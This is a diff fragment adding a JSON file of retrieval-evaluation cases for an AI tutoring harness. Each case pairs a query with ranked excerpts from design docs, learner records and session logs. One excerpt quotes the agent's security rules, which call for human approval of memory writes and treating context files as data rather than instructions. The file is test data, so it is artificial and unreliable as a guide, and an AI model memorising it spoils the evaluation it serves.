Experiment-first loop (try things — a play-adjacent posture)\n\n**Features to catch:**\n\n| Feature | Status | Notes |\n|---------|--------|-------|\n| Playful project variants | Not started | Offer silly/small/exploratory versions of growth-edge tasks before the \"real\" assignment |\n| Playfulness prompts in project selection | Not started | \"What excites you? What twist would make you more engaged?\" Part of project-goal mapping (P3). |\n| Exploratory reflection prompts | Not started | Make the reflective toolkit itself playful, not just evaluative. \"Explain mi",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.6855442688637592,
+            "source": "design/complete/prd.md",
+            "section": "chars 10200-10684",
+            "text": " Full\n  assessment in `coordination/architecture.md` §ClaudeConnect.\n- Roger was built by a learner with a teaching background and strong\n  pedagogical intuitions. How well does the tutor adapt to someone who\n  doesn't share that? Can it hold the expert-teacher role on its own, or\n  does it need a user who already knows how to be taught?\n- **Platform layer:** Courses, schools, cohorts as GitHub-native\n  entities. Early design captured in `design/platform-layer.md`\n  (2026-02-25).",
+            "charCount": 484
+          }
+        ],
+        "hit": true,
+        "totalPayload": 4484
+      },
+      {
+        "id": "h4-recall-gap",
+        "query": "User circling on TypeScript type syntax — gap type and recommended intervention",
+        "context": "User tried 3 times to write a TypeScript interface, knows the concept but can't remember exact syntax.",
+        "expectedSources": [
+          "learning/arcs.md",
+          "learning/current-state.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.6556449362741944,
+            "source": "learning/current-state.md",
+            "section": "chars 8500-10500",
+            "text": "ypescript-declaration-merging (3) and unquizzed typescript-type-definitions import\n    history:\n      - { date: 2026-02-12, score: 3, note: accurately described declaration merging as \"type declaration that updates the global namespace of the Express Request type.\" Cannot reproduce declare namespace syntax. }\n\n  - name: contract-evolution\n    arc: typescript\n    score: 4\n    source: quiz\n    last-quizzed: 2026-02-13\n    times-quizzed: 1\n    history:\n      - { date: 2026-02-13, score: 4, note: contract-first approach — update interface, bring implementations in line, discard dead weight. Sound pragmatic reasoning. }\n\n  - name: typescript-type-narrowing\n    arc: typescript\n    score: 3\n    gap: conceptual\n    source: quiz\n    last-quizzed: 2026-02-13\n    times-quizzed: 1\n    history:\n      - { date: 2026-02-13, score: 3, note: correct practical distinction (.some reports, .filter produces new array) but imprecise on mechanism — issue is TS can't propagate boolean back to narrow source type, not about return statements. }\n\n  - name: git-branching-and-prs\n    arc: git-workflow\n    score: 5\n    source: audit:observed\n    last-quizzed: 2026-02-16\n    times-quizzed: 1\n    evidence: tic-tac-toe — 14+ PRs, feature branches, merge workflow across 42 commits\n    note: Bumped from 4 based on audit evidence — collaborative multi-dev workflow, designed automated startwork integration with GitHub project boards.\n    history:\n      - { date: 2026-02-16, score: 4, note: \"MC. Correct on multi-pass branch continuity (continue on existing feature branch). Designed the workflow config: base_branch in frontmatter, --base on PR create. Practical gap was applying git in AI-orchestrated workflows, not git mechanics.\" }\n      - { date: 2026-03-03, score: 5, source: audit:observed, note: collaborative multi-dev workflow with conflict resolution, designed startwork GitHub integration }\n\n  - name: compaction-and-handoffs\n    arc: context-engineering\n    score: 5\n    source: audit:observed\n    l",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.6380564301852957,
+            "source": "design/teaching-principles.md",
+            "section": "chars 6800-7930",
+            "text": "learner to *experience* them independently, building new\n   memory that overwrites the collapsed pattern.\n\n### Relation to design principles\n\nDecoupling is an instance of P4 (intervention matches the gap). The\nspecific kind of stuckness is a collapse; the specific kind of\nintervention is contrastive decoupling. The diagnostic step (identify\nthe collapse) maps to P4's \"read what kind of help is needed before\nchoosing how to respond.\"\n\n---\n\n## Draft notes\n\nPrinciples to potentially add in future sessions:\n\n- **Schedule as accountability structure** — regular check-ins are\n  load-bearing for the teaching relationship. Not just logistics but\n  a motivational and relational commitment. (May belong here or in\n  the relationship design doc.)\n- **Generalization through specificity** — related to T1's\n  multi-scale resolution. Teaching often moves from specific instance\n  to general pattern, not the reverse. The specific grounds the\n  general.\n- **The teacher is an obligate student** — already in P10's boundary\n  conditions, but may deserve its own teaching principle about how\n  the feedback loop improves teaching itself.",
+            "charCount": 1130
+          },
+          {
+            "rank": 3,
+            "score": 0.6324837397469552,
+            "source": "learning/session-logs/2026-02-11.md",
+            "section": "chars 3400-4591",
+            "text": "ught Anthropic type coupling)\n- Wrote 100% of implementation code across three PRs\n- req.body vs req.params jumped from 2 to 4 through contextual use, not explicit study\n\n**Growth edges:**\n- Async mental model has the shape but not the vocabulary (event loop, call stack, task queue)\n- TypeScript type propagation through complex structures (couldn't find where to annotate the `create()` return type)\n- Foreign key direction in relational modeling (child references parent)\n- \"I need a course\" reflex appeared briefly around SQL, redirected successfully\n- Distinction between \"interface leaking\" and \"implementation not fulfilling contract\"\n\n## Key files created/modified\n- `chatbot/storage.ts` — Storage interface, InMemoryStorage, SqlLiteStorage\n- `chatbot/tests/storage.test.ts` — 10 tests running against both implementations (20 total)\n- `chatbot/server.ts` — SwappedSqlLiteStorage in, routes restructured under /chats/:id\n- `chatbot/package.json` — added vitest, better-sqlite3\n\n## Remaining work\n- Server: POST /chats (create), GET /chats (list all), DELETE implementation\n- Frontend: conversation switching UI with drawer component\n- Phase 4 (Supabase) — speed round if time permits",
+            "charCount": 1191
+          }
+        ],
+        "hit": true,
+        "totalPayload": 4321
+      },
+      {
+        "id": "h5-cross-domain",
+        "query": "Player disconnection/reconnection in multiplayer game — learner's prior experience with real-time state management",
+        "context": "User designing multiplayer disconnect/reconnect flow. Has prior WebSocket game architecture experience.",
+        "expectedSources": [
+          "learning/arcs.md",
+          "learning/current-state.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7519838129492113,
+            "source": "research/schelling-points-architecture.md",
+            "section": "chars 8500-8923",
+            "text": "host-controlled or consensus? The `LOBBY_STATE` message includes an `isReady` array, suggesting consensus, but no toggle handler exists.\n4. **Player disconnect handling.** The `PlayerInfo` holds a WebSocket reference but there's no disconnect/reconnect logic beyond `SUBSCRIBE_GAME`'s reconnection check.\n5. **Multi-round state.** `previousScoresAndGuesses` array exists on `PlayerInfo` but nothing accumulates into it yet.",
+            "charCount": 423
+          },
+          {
+            "rank": 2,
+            "score": 0.716895872476411,
+            "source": "learning/goals.md",
+            "section": "chars 6800-8800",
+            "text": "aliveness and agency while breaking the small-audience bottleneck.\nA platform/systems problem — the same class of problem weft is solving\nin education.\n\nThe systems design skill being built through weft directly enables this:\nreal-time multiplayer state management, multi-agent orchestration, human-\nagent boundary design, and platform architecture all transfer. Schelling\nPoints was a prototype exercise in this space — cooperative group\ndynamics mediated by a real-time system.\n\n**Capabilities demonstrated:**\n- Real-time multiplayer architecture — full WebSocket game with server-authoritative state, discriminated union messages, broadcast patterns, disconnect handling (Schelling Points)\n- Game design for group dynamics — cooperative scoring, convergence mechanics, player incentive structures (Schelling Points)\n- State machine design — 5-phase game with clean transitions, reducer-shaped event handling (Schelling Points)\n- Mobile-responsive interactive UI — viewport management, scroll containment, 100dvh, flex-shrink (Schelling Points)\n\n### Sustainable income: consulting and systems design\n\nConsulting and training for organizations adopting agent-augmented\nworkflows. The offering: take a team's existing process, redesign it\nwith agent orchestration, and teach the team to operate the new system.\nThis requires systems design (the core skill), evaluation fluency in\ntechnical domains (enough to assess agent output across the stack), and\nthe ability to teach — all of which compound toward the other two goals.\n\nThe industry doesn't yet have standard titles or hiring pipelines for\nthis role. That means defining the frame, not fitting into one. The\nportfolio includes shipped products (Schelling Points), designed systems\n(weft harness), and team leadership (4-person architecture on a group\nproject). The missing piece is a demonstration of orchestrated\ndevelopment applied to someone else's problem.\n\n**Capabilities demonstrated:**\n- Full-stack web application delivery — Schelling P",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.6826059649599958,
+            "source": "design/complete/startwork.md",
+            "section": "chars 8500-9690",
+            "text": "s make human-to-human learning more fruitful even for\n  non-users?\n- Can the system structurally encourage human bonds to form?\n- What does the solo learner without a peer group need?\n\n### Playfulness\n- How does the system select for play-state in project generation?\n- Can the reflective toolkit itself be playful?\n- How does the system detect play-state vs. grind-state?\n\n### Document architecture\n- ~~Do current-state.md and goals.md live in a standard location?~~\n  **Resolved:** All learning state lives in `learning/` —\n  `learning/goals.md`, `learning/arcs.md`, `learning/current-state.md`,\n  `learning/session-logs/`. Static analytical framework in\n  `.claude/references/developmental-model.md`.\n- What's the reconciliation mechanism between current-state and goals?\n  Arcs bridge the gap: goals decompose into arcs (capability clusters),\n  arcs track complexity/chunking state, current-state tracks individual\n  concept scores. Startwork reads all three layers.\n- ~~How does the system handle a new user with no current-state data?~~\n  **Resolved:** `/intake` skill generates initial learning/goals.md,\n  learning/arcs.md, and learning/current-state.md from background + interview.",
+            "charCount": 1190
+          }
+        ],
+        "hit": false,
+        "totalPayload": 3613
+      },
+      {
+        "id": "h6-drift",
+        "query": "Session drifting from user's stated priority — what are the user's current goals and deadlines?",
+        "context": "User said 'finish API routes, deadline tomorrow' but Builder Claude started refactoring database schema.",
+        "expectedSources": [
+          "learning/goals.md",
+          "learning/arcs.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7167755978691726,
+            "source": "design/projects-feature.md",
+            "section": "chars 15300-17300",
+            "text": "ghter and puts the prompt where it's most useful — at\nsession start, when the user is deciding what to work on.\n\n### State conflicts between records\n\nMultiple sources describe project state. They can disagree:\n\n| Source | What it says | Authority |\n|--------|-------------|-----------|\n| `projects.md` `Needs next` | Last session-review's assessment | Persistent, explicit |\n| Session log \"remaining work\" | What the most recent session ended with | Session-scoped, may be more recent than projects.md |\n| Git state at `Path` | What's actually on disk — branches, uncommitted work, merged PRs | Ground truth for code state |\n| Schedule/TODO files in project | Deadlines, task lists maintained outside the harness | Project-local, may contradict `Deadline` |\n\nThe plan doesn't specify a reconciliation protocol. Proposal:\n\n**Startwork treats git state as ground truth for code state and\nprojects.md as ground truth for learning state.** When they conflict,\nstartwork names the conflict rather than silently picking one:\n\n> \"Projects file says 'write API endpoints' but the api branch at\n> ~/projects/app was merged 3 days ago. Looks like that's done — want\n> me to update the project?\"\n\nThis keeps the human in the loop (P7) and uses startwork's Gather phase\n— where it already reads both sources — as the natural reconciliation\npoint.\n\nFor session log vs. projects.md conflicts: the most recent session log's\n\"remaining work\" should generally win over an older `Needs next`, since\nit's closer to the actual state. Session-review already updates `Needs\nnext` from session evidence — the conflict only arises when session-\nreview wasn't run. Startwork could prefer the session log's remaining\nwork when it's more recent than `Last touched`.\n\n---\n\n## Before implementing: what this plan still needs\n\nThe skill changes sections (Intake, Session-review, Startwork) describe\nthe core data flow: seed, update, read. But the open questions above\nsurface design work that hasn't been promoted into those secti",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.7119639854759026,
+            "source": "design/complete/startwork.md",
+            "section": "chars 1700-3700",
+            "text": "id-flight. Unfinished\nbranch, uncommitted work, in-progress checklist item. Default to\nfinishing what you started — context-switching fragments awareness.\n\n**Tier 2: Deadline-driven.** What has a hard date. Assignment due dates,\ndemo prep, calendar-bound deliverables. Surface proximity: \"Assignment X\nis due in 2 days, estimated at 4-6 hours of work.\"\n\n**Tier 3: Unblocking.** What needs to happen before other things can.\nThree detection approaches (not mutually exclusive):\n- **Manual annotation** — lightweight dependency syntax in local files\n- **Design doc analysis** — heuristic scan for dependency language\n- **Current-state-informed prerequisites** — learning/goals.md says you\n  need concept X; learning/current-state.md says you're at level 1; flag it\n\n**Tier 4: Growth-edge.** What's at the developmental frontier. Surfaced\nthrough the lens of active projects: \"This project needs useReducer,\nand you're at level 2 — this is where the learning happens.\"\n\n**Tier 5: Maintenance.** Stale todos, cleanup, documentation, review.\nImportant over time, never urgent in a given session.\n\n**Demotion rule:** Items with flags (blocked, needs-decision,\nwaiting-on-external) rank below clean items at the same tier.\n\n### Time budgeting\n\n1. **Ask up front:** \"How much time do you have?\" Transforms output\n   from \"here's everything\" to \"given 2 hours, here's a session plan.\"\n2. **T-shirt sizing:** Small (<30 min), medium (1-2h), large (half\n   day+). Human confirms or adjusts.\n3. **Historical tracking:** Session logs record duration and work done.\n   Estimator improves through use (P6).\n4. **Awareness-informed adjustment:** If the student reports low energy\n   or fragmented state, adjust estimates upward.\n5. **Session plan composition:** Given time budget and ranked options,\n   compose a suggested plan. Human approves or overrides (P7).\n\n### Output: session briefing\n\n```\n## Session Briefing — Sunday Feb 23\n\n### The gap that matters most right now\n- Goal: \"Build and deploy full-stack apps",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.6976736326963116,
+            "source": "design/complete/startwork.md",
+            "section": "chars 0-2000",
+            "text": "# Startwork — Solo & Team Specification\n\nCanonical spec for the `/startwork` command in both solo and team forms.\nThe purpose is the same in both: **compose the user's attention at\nsession start** by reading the landscape of state, computing what\nmatters, and proposing how to spend the session.\n\n**Companion docs:**\n- Team startwork command (executable): `coordination/commands/startwork.md`\n- Harness features registry: `design/harness-features.md` (P2 Attention)\n- Design principles: `design/design-principles.md`\n\n---\n\n## Solo Startwork\n\n### Purpose\n\nRead the landscape of local state, compute the gap between current\nstate and goals, and propose a coherent session plan. The student\napproves, adjusts, or overrides.\n\nThis is an attention-composition tool (P2). It doesn't just rank\ntasks — it reads the full context and proposes a session.\n\n### Data sources (the solo gather)\n\nAll local. No network calls. Fast.\n\n| Source | What it tells you |\n|--------|------------------|\n| Git state (branch, uncommitted work, recent commits) | What was in-progress |\n| Local todo files (agent todos, checklists) | Outstanding items |\n| learning/current-state.md (scores, gaps, staleness) | Where the growth edge is |\n| learning/goals.md (goal states, active projects) | Where the student is headed |\n| learning/arcs.md (developmental lines, capability clusters) | What skill sequences serve the goals |\n| learning/session-logs/ | What happened last, unfinished threads |\n| Project schedule (assignments, milestones, due dates) | What has a hard deadline |\n| Design docs / build checklist | What's planned but unbuilt |\n\n### Priority model\n\nFive tiers, in order:\n\n**Tier 1: Continuation.** Something already mid-flight. Unfinished\nbranch, uncommitted work, in-progress checklist item. Default to\nfinishing what you started — context-switching fragments awareness.\n\n**Tier 2: Deadline-driven.** What has a hard date. Assignment due dates,\ndemo prep, calendar-bound deliverables. Surface proximity: \"Assignment ",
+            "charCount": 2000
+          }
+        ],
+        "hit": false,
+        "totalPayload": 6000
+      },
+      {
+        "id": "h7-altitude",
+        "query": "User zoomed into implementation detail when the task is architectural evaluation — relevant developmental patterns or reference material",
+        "context": "User researching PostgreSQL wire protocol binary format when the actual task is choosing a database.",
+        "expectedSources": [
+          "references/developmental-model.md",
+          "references/context-patterns.md",
+          "design/design-principles.md"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7407980252914044,
+            "source": ".claude/references/developmental-model.md",
+            "section": "chars 0-2000",
+            "text": "# Developmental Model\n\nReference for analyzing a learner's development. Consulted during\nintake (background analysis, interview calibration), session review\n(scoring context), and startwork (priority computation).\n\nThis is system knowledge — it does not change per user.\n\n---\n\n## Two development dimensions\n\nEvery skill develops along two semi-independent dimensions:\n\n**Complexity level (top-down).** What order of abstraction the learner\ncan bring to bear. Higher complexity enables recognition of structural\nisomorphisms across domains — the bridge phenomenon. A skill becomes\n*functional* at one complexity level and *generative* (producing bridges\nto other domains) at a higher level.\n\n**Chunking depth (bottom-up).** How fluent the learner's domain-specific\npattern recognition is. Built through reps. Letters → words → sentences.\nIndividual chess positions → familiar configurations → whole game states.\nuseState calls → component patterns → architectural patterns. Chunking\nbinds frequently co-occurring patterns into single recognizable units.\nThis is what gives experts their \"at a glance\" quality.\n\nThese interact but don't substitute for each other:\n\n| Complexity | Chunking | State | Move |\n|---|---|---|---|\n| High | Low | Correct shape, wrong boundary | Reps — bridge is built, chunks need to wire |\n| Low | Low | Unfamiliar territory | Bridge first, then reps |\n| Low | High | Learned the handshake | Fine as-is; invest complexity only if domain warrants it |\n| High | High | Fluent and generative | Bridge-ready material for other domains |\n\nThe gap between complexity and chunking for a given skill is diagnostic:\nit tells you whether the next move is reps or abstraction.\n\n---\n\n## Three dependency types\n\n**Hard prerequisites.** X genuinely requires Y. Stable across learners.\nHandled by ordering within a capability cluster.\n\n**Bridge dependencies.** X is dramatically easier given Y from another\ndomain. Complexity-gated — visible only at a sufficient complexity\nlevel. Learner-s",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.7242431707657957,
+            "source": "research/learning-model-research-plan.md",
+            "section": "chars 0-2000",
+            "text": "# Developmental State Representation: Research Synthesis\n\n## Context\n\nThe harness tracks learner development in `current-state.md` using flat\nconcept scores (0-5) and gap types (conceptual/procedural/recall). The\ndevelopmental model (`developmental-model.md`) describes two dimensions\n(complexity × chunking) and three dependency types (hard, bridge,\naltitude) — but these aren't encoded in persistent state. They live in\nreference docs that skills consult during reasoning.\n\nAs the system scales from one user to hundreds across multiple domains,\nthe question is whether this flat representation can sustain principled\ndecision-making — or whether it needs structural enrichment that\npreserves hierarchical relationships without drowning the agent in data.\n\n**Driving question:** What is the best way to represent the learner's\ndevelopmental state that optimizes for high fidelity with reality, high\ndata portability from domain to domain, and fast/cheap legibility to a\nworking agent?\n\n---\n\n## 1. The evolution of state representation in roger\n\nThe roger project reveals a trajectory from narrative to structured\nrepresentation that hasn't been completed:\n\n**Stage 1: Prose growth profile** (`roger/reference/growth.md`)\nIntake-era. Organized by technology domain (React, Node/Express, TS,\nTesting, Git). Each domain has: level label (\"Solid fundamentals, ready\nfor intermediate patterns\"), code evidence excerpts, and calibration\nnotes (\"Don't over-explain useState. Do introduce useReducer when state\ngets complex.\"). Complexity is implicit: \"ready for intermediate\npatterns\" is a complexity-readiness signal. \"Evidence of readiness for\nuseReducer/Context: BlogList App has 9+ useState calls\" is a\nchunking-to-complexity transition signal — the reps have produced the\npain that makes the abstraction meaningful (an altitude dependency).\n\n**Stage 2: Flat YAML tracking** (`roger/learning/current-state.md`)\nSession-review-era. Organized by individual concept. Each concept has:\nscore (0-5), gap ty",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.7227231385213295,
+            "source": "design/complete/prior-art-sources.md",
+            "section": "chars 32300-34300",
+            "text": "appreciating the\ndifference between adjacent ranges -- that generally takes time and\ntraining -- but you'll find it easy to see differences that are further\napart.\"\n\n### Domain-specific vs. domain-general\n\nDawson's research directly addresses the relationship between domain-\nspecific and domain-general developmental assessment. Key findings:\n\n- The Hierarchical Complexity Scoring System (HCSS) uses criteria\n  independent of specific conceptual content -- it measures the\n  *structural complexity* of reasoning, not the content.\n- The sequence of conceptual development generally matches across domain-\n  specific and domain-general assessments.\n- HCSS and LAAS (Lexical Abstraction Assessment System) scores are not\n  only more statistically reliable than domain-specific scoring systems\n  but more likely to exhibit psychometric qualities consistent with\n  developmental theory.\n- However, domain-specific assessments capture content-relevant nuances\n  that domain-general systems miss.\n\nThe practical implication: you CAN measure developmental complexity\nacross domains with a single metric, and that metric is MORE reliable\nthan domain-specific measures. But domain-specific tracking adds\nimportant content information that the general metric misses.\n\n### What it offers maestro\n\n**Validates the \"assessment resolution constrains representation\"\nprinciple.** Dawson's work empirically demonstrates that distinguishing\nadjacent developmental levels is hard -- it requires trained analysts\nand careful instrumentation. This directly validates the existing\ndocument's Dilemma 1 (assessment resolution ceiling). If trained humans\nstruggle to distinguish adjacent phases, an automated system should be\neven more cautious about claiming fine-grained developmental\ndistinctions.\n\n**The phase system offers a granularity template.** The four-phase\nwithin-level structure (transitional, unelaborated, elaborated, highly\nelaborated) could inform maestro's chunking dimension. There's a rough\ncorresponde",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 6000
+      },
+      {
+        "id": "r1-git-ship",
+        "query": "Building a git commit/push/PR skill — learner designing CLI automation for developer workflow",
+        "context": "User designing a skill that automates git staging, committing, and PR creation.",
+        "expectedSources": [
+          "learning/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.72329710723776,
+            "source": "design/complete/build-plan-week4.md",
+            "section": "chars 3400-5400",
+            "text": " capability cluster emerging).\n     Human-gated — user approves, edits, or skips.\n   - Consumer interface: goals and arcs are now explicitly documented\n     as inputs to the startwork skill.\n\n10. **Install package directory structure** — `package/` now ships with\n    `learning/` and `learning/session-logs/` via `.gitkeep` files. No\n    skill has to create these directories. `.gitignore` uses the same\n    `*` / `!.gitkeep` pattern as `background/`.\n\n11. **Repo rename: maistro → maestro** — Migration script\n    (`scripts/rename-to-maestro.sh`) renamed directory, updated Claude\n    config paths, verified no stale references.\n\n### Remaining (pushed to Wednesday)\n\n- **README + single-action initialization flow** — The onramp that\n  makes `/intake` discoverable. New user clones repo, reads README,\n  runs one command, lands in the interview. Package README exists but\n  the init flow isn't wired.\n- **Solo `/startwork`** — Designed, consumes goals/arcs/current-state.\n  Session-review now feeds it explicitly.\n\n### Deferred\n\n- Coordination layer (team startwork, triage, dependency protocol) —\n  pushed to Thursday. Harness depth was higher priority than breadth.\n\n### Action items surfaced during build\n\n- **Solo project brainstorm skill** — Intake may surface that a learner\n  has no current projects. The coordination layer has a brainstorm\n  workflow (`coordination/commands/workflows/brainstorm.md`) and skill\n  (`coordination/skills/brainstorming/SKILL.md`) designed for team\n  feature brainstorming. Adapt to a solo version scoped to project\n  brainstorming: takes the learner's goals and growth edge as input,\n  explores project ideas that would serve those goals, produces a\n  project brief. Could reuse the coordination brainstorm's phased\n  structure (understand → explore approaches → capture → handoff) with\n  the learner model as context instead of a team codebase.\n\n- **Agent feedback skill** — Replaces session-review Phase 4's strict\n  structural schema with a standalone skill ",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.7093770675955854,
+            "source": "design/week5-prd.md",
+            "section": "chars 6800-7373",
+            "text": "rsion tag scheme\n  (v0.1.0, calendar-based, etc.), or just tag the commit?\n- **Platform layer:** Courses, schools, cohorts as GitHub-native\n  entities. Early design in `design/platform-layer.md` (2026-02-25).\n  Unchanged from week 4.\n- Roger was built by a learner with a teaching background and strong\n  pedagogical intuitions. How well does the tutor adapt to someone who\n  doesn't share that? Can it hold the expert-teacher role on its own, or\n  does it need a user who already knows how to be taught? Week 5\n  two-user verification will produce first real data on this.",
+            "charCount": 573
+          },
+          {
+            "rank": 3,
+            "score": 0.6939247203960212,
+            "source": "learning/audits/three-week-audit-2026-03-03.md",
+            "section": "chars 5100-7100",
+            "text": "nt-state.md scoring, gap classification)\n- Multi-agent tutoring orchestration (parallel review agents, phase-sequenced builds)\n- Product vision and PRD (\"Fractal Learning Engine\" three-tier architecture)\n- Voice-to-text as primary input (SuperWhisper integration, 19 skill shortcuts)\n- Privacy/security design for learner data (tier-based privacy concerns in PRD)\n\n**Sustainable Income:**\n- Full-stack web application delivery (Schelling Points shipped)\n- Team leadership and systems integration (led 4-person team, designed coordination)\n- AI-augmented development velocity (multi-agent workflow system, multi-PR sessions)\n- Technical writing for stakeholders (PRD, pitch, bridge prompt, game instructions)\n\n---\n\n## III. Automation: Repeated Patterns That Should Be Commands\n\n### Highest-impact automations (ranked by daily time savings)\n\n**1. `/ship` — The git shipping sequence** (est. 8-16 min/day)\n\n\"commit, push, PR, merge\" appears in ~70% of substantial sessions, 3-5\ntimes per active day. Every time it's a free-text instruction with\nvariations. A single skill that stages, commits with auto-generated\nmessage, pushes, creates PR, and optionally merges would collapse the\nmost repeated multi-step instruction into one invocation.\n\n**2. Combined `/handoff`** (est. 5-10 min/day)\n\n`/handoff-test` is almost always immediately followed by\n`/handoff-prompt`. They should be one skill with `--test-only` and\n`--prompt-only` flags for the rare cases where you want them separately.\n\n**3. `/workflows:next` — Auto-advance workflow phases** (est. 5-8 min/day)\n\nThe brainstorm->plan->work->review->compound sequence requires manual\ninvocation at each step with the prior artifact's path. A\n`/workflows:next` command that detects the current phase, locates the\ninput file, and proposes the next step would collapse 4-5 messages\ninto 1.\n\n**4. CSS batching convention** (est. 5 min/styling session)\n\nSessions show 10+ single-property CSS tweaks in sequence (\"move it up\n15px\", \"a little lighter\", \"even l",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 4573
+      },
+      {
+        "id": "r2-security",
+        "query": "Applying security deny rules to settings — learner's understanding of permission models and attack surfaces",
+        "context": "User working on security deny rules for Claude Code settings files.",
+        "expectedSources": [
+          "design/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.7258179610173634,
+            "source": "design/teacher-role/teacher-relationship.md",
+            "section": "chars 17000-19000",
+            "text": "s, video conferencing integration.\n\n---\n\n## Consent and authority\n\n### Consent model\n\nPublishing is binary. The student decides whether to share learning\ndata with a teacher, and the teacher gets all of it. No domain-level\ngranularity.\n\n**Rationale:** Learning isn't domain-specific. It starts in one domain,\nripples to others, is bridged by them. Domain-channel constraints would\noverburden both parties and assume too much about how learning works.\nIf deeply personal learning content arises as a concern, granularity\ncan be added later.\n\n### Teacher access depth\n\nThe teacher gets deep access to the student's learning state throughout\nthe relationship. Not surface data, not structural metadata — the\nactual learning state at the level of depth the student is operating\nat. The per-relationship private repo ensures this stays between\nteacher and student.\n\nThis is distinct from the public signal (`public-signal.md`), which is\na privacy-stripped structural snapshot (score distributions, no concept\nnames) designed for public dashboards or developer/coordinator views.\nThe two have nothing to do with each other.\n\n### Authority model\n\nThe teaching relationship is a triad: teacher, student, and the\ndomain being studied. The teacher's authority is domain-specific —\nit derives from expertise in the domain, not from a general\nhierarchical position. Authority does not transfer across domains.\n\nThe student grants authority to the teacher. This grant is:\n- **At-will** — either party can exit at any time\n- **Conditional** — premised on the teacher acting in the student's\n  developmental interest\n- **Revocable** — the student can withdraw the grant at any time\n\nWhen teacher guidance conflicts with student intent, the student has\ntwo valid moves:\n1. **Defer** — \"I trust your expertise here more than my own judgment.\n   I'll provisionally pursue what you suggest.\"\n2. **Revoke** — \"I no longer grant you authority over this.\"\n\nBoth are legitimate. **The system has no role in resolving author",
+            "charCount": 2000
+          },
+          {
+            "rank": 2,
+            "score": 0.6872125164698412,
+            "source": "design/harness-features.md",
+            "section": "chars 15300-17300",
+            "text": "ignal loss from premature cleanup. |\n\n---\n\n### P7. Human authority is non-negotiable\n\nThe human drives. The system proposes, the human disposes. See\n`design/design-principles.md` §7.\n\n**Existing implementations:**\n- Operating principle #1 (agency over efficiency)\n- Memory security rules (all writes require human approval)\n- Experiment-first loop (user tries, observes, then asks)\n- Tutor posture (Socratic — help the user do the cognitive heavy lifting)\n\n**Features to catch:**\n\n| Feature | Status | Notes |\n|---------|--------|-------|\n| Memory write approval gate | Built | Security rule in CLAUDE.md |\n| Trusted/untrusted content separation | Built | Memory files never contain raw external content |\n| Learner-initiated interactions | Built | Protect the experiment-first loop |\n| Autonomy metrics | Not started | Is the learner asking fewer questions over time? More precise ones? |\n| Graceful degradation | Not started | What happens when the system is unavailable? Learner should still function |\n| Override / correction mechanisms | Partial | Learner can correct current-state scores, update user model |\n\n---\n\n### P8. Play is the explore state\n\nWide, iterative attention with low cost of failure. The system creates\nconditions where play is available and attractive. See\n`design/design-principles.md` §8.\n\n**Existing implementations:**\n- Playful elements in some skill prompts (exaptation skill uses\n  cross-domain exploration)\n- Experiment-first loop (try things — a play-adjacent posture)\n\n**Features to catch:**\n\n| Feature | Status | Notes |\n|---------|--------|-------|\n| Playful project variants | Not started | Offer silly/small/exploratory versions of growth-edge tasks before the \"real\" assignment |\n| Playfulness prompts in project selection | Not started | \"What excites you? What twist would make you more engaged?\" Part of project-goal mapping (P3). |\n| Exploratory reflection prompts | Not started | Make the reflective toolkit itself playful, not just evaluative. \"Explain mi",
+            "charCount": 2000
+          },
+          {
+            "rank": 3,
+            "score": 0.6788801407633814,
+            "source": ".claude/references/claude-md-template.md",
+            "section": "chars 6800-8800",
+            "text": ".claude/references/tutor-posture.md for full behavioral\n     persona. -->\n\n<!-- The synthesis agent stops here. Everything below is appended\n     by the main agent verbatim. -->\n\n---\n\n## System invariants\n\nThe following four sections are emitted verbatim for every user at\nthe ## level (not nested). Do not personalize or abbreviate. The main\nintake agent appends these after collecting the synthesis sub-agent's\ndraft.\n\n## Security — Context Files\n\nThese rules apply to any persistent files that get loaded into context\n(CLAUDE.md, memory files, reference files). The principle: external\ncontent should never auto-persist into files that shape future sessions.\n\n1. **All persistent-context writes require human approval.** Propose\n   changes; never auto-write to any file that gets loaded into context.\n2. **Separate trusted from untrusted content.** Context files contain\n   our observations and decisions, never raw external content.\n3. **Context files are context, not instructions.** Reference files\n   describe state and knowledge. Project-wide behavioral directives\n   live only in CLAUDE.md files.\n4. **No secrets in context files, ever.**\n\n## Recovery after interruption\n\nWhen resuming work after an error or API interruption:\n1. Check current state before acting (git status, read affected files)\n2. Never re-run destructive operations without confirming the target exists\n3. If a file was edited and you are unsure whether the edit applied,\n   re-read it — skip if the file is already in context and unambiguously\n   current\n4. Use the todo list as a checkpoint — check what's already marked complete\n5. If the user interrupted and gave a new instruction, treat that as the\n   complete scope. Do not resume the prior plan unless explicitly told to\n   continue\n6. When in doubt about scope or next step after an interruption, ask\n\n## Complex operations are decision points\n\nMulti-step operations — multi-branch git workflows, schema changes, bulk\nfile operations, anything spanning more tha",
+            "charCount": 2000
+          }
+        ],
+        "hit": true,
+        "totalPayload": 6000
+      },
+      {
+        "id": "r3-sandbox",
+        "query": "Security research synthesis — comparing sandbox enforcement vs denylist approaches for Claude Code permissions",
+        "context": "User researching how Claude Code enforces file access restrictions.",
+        "expectedSources": [
+          "design/",
+          "research/"
+        ],
+        "results": [
+          {
+            "rank": 1,
+            "score": 0.6682175652603665,
+            "source": "design/complete/2026-03-05-git-remote-exfil-deny-rules.md",
+            "section": "chars 0-2000",
